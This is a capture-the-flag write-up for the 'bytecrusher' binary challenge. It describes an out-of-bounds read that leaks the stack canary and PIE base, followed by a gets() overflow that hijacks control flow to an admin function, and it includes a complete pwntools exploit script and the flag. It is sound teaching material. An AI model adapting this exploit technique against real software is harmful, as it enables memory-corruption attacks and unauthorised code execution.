# binary - bytecrusher

Bugs: crush_string() OOB read + gets() overflow

Leak: crush_string
steps input with stride rate. With rate = T (large), the loop jumps from input[0] directly to input[T], skipping the null terminator and landing on raw stack bytes. 

Leaked value ends up in crushed[1] which puts() prints.

Use 13 of 16 free trials:

rate=73–79 → leak canary bytes 1–7

rate=88–93 → leak return address → PIE 

base = ret - 0x15ec

Overflow (gets() in get_feedback):
`'A'*24 + p64(canary) + 'B'*8 + p64(base + 0x12a9)`

→ jumps to admin_portal() which prints flag.txt

```
#!/usr/bin/env python3
from pwn import *
import sys

BINARY = './bytecrusher'
context.binary = elf = ELF(BINARY)
context.arch = 'amd64'


FREE_TRIAL_RET_OFFSET = 0x15ec   # return addr pushed when main calls free_trial
ADMIN_PORTAL_OFFSET   = 0x12a9   # admin_portal() function


def do_trial(p, input_str: bytes, rate: int, output_len: int) -> bytes:
    p.sendlineafter(b'Enter a string to crush:\n', input_str)
    p.sendlineafter(b'Enter crush rate:\n', str(rate).encode())
    p.sendlineafter(b'Enter output length:\n', str(output_len).encode())
    p.recvuntil(b'Crushed string:\n')
    return p.recvline(drop=True)

def leak_byte_at_offset(p, offset: int) -> int:
    """Leak the byte at `offset` from input_buf using rate=offset.
    Result ends up at crushed[1] in the output."""
    inp = b'A' * 31   # fill input_buf with non-null chars
    result = do_trial(p, inp, offset, 32)
    return result[1] if len(result) >= 2 else 0

def exploit():
    if '--remote' in sys.argv:
        host, port = sys.argv[sys.argv.index('--remote') + 1].split(':')
        p = remote(host, int(port))
    else:
        p = process(BINARY)

    context.log_level = 'info'
    p.recvuntil(b'We are happy to offer sixteen free trials of our premium service.\n')

    # ── Phase 1: Leak canary bytes (offsets 73–79) ───────────────────────────
    canary_bytes = bytearray(8)
    canary_bytes[0] = 0x00      # always null on x86-64

    for i in range(1, 8):      # 7 trials
        canary_bytes[i] = leak_byte_at_offset(p, 72 + i)

    canary = u64(bytes(canary_bytes))
    log.success(f'Canary: {hex(canary)}')

    # ── Phase 2: Leak return address bytes (offsets 88–93) ───────────────────
    # High 2 bytes (offsets 94, 95) are always 0x00 on 64-bit Linux.
    ret_bytes = bytearray(8)

    for i in range(6):          # 6 trials (high 2 bytes = 0)
        ret_bytes[i] = leak_byte_at_offset(p, 88 + i)

    ret_addr = u64(bytes(ret_bytes))
    base = ret_addr - FREE_TRIAL_RET_OFFSET
    admin_portal = base + ADMIN_PORTAL_OFFSET

    log.success(f'Return addr: {hex(ret_addr)}')
    log.success(f'PIE base:    {hex(base)}')
    log.success(f'admin_portal:{hex(admin_portal)}')

    # ── Burn remaining trials (used 7+6=13 of 16) ───────────────────────────
    for _ in range(3):
        do_trial(p, b'x', 1, 1)

    # ── Phase 3: gets() overflow in get_feedback() ───────────────────────────
    # Distance from buf[0] to canary = 24 bytes
    # Then: 8-byte canary + 8-byte saved_rbp + 8-byte return addr
    payload  = b'A' * 24           # padding to canary
    payload += p64(canary)          # keep canary intact
    payload += b'B' * 8             # saved rbp (don't care)
    payload += p64(admin_portal)    # redirect return to admin_portal

    p.sendlineafter(b'Enter some text:\n', payload)

    # ── Collect flag ─────────────────────────────────────────────────────────
    p.recvuntil(b'Welcome dicegang admin!\n')
    flag = p.recvall(timeout=3).decode().strip()
    log.success(f'FLAG: {flag}')

    p.close()

if __name__ == '__main__':
    exploit()
```

flag:`dice{pwn3d_4nd_coRuSh3d} `

Compiled by: yappare
Solved by: Ha1qal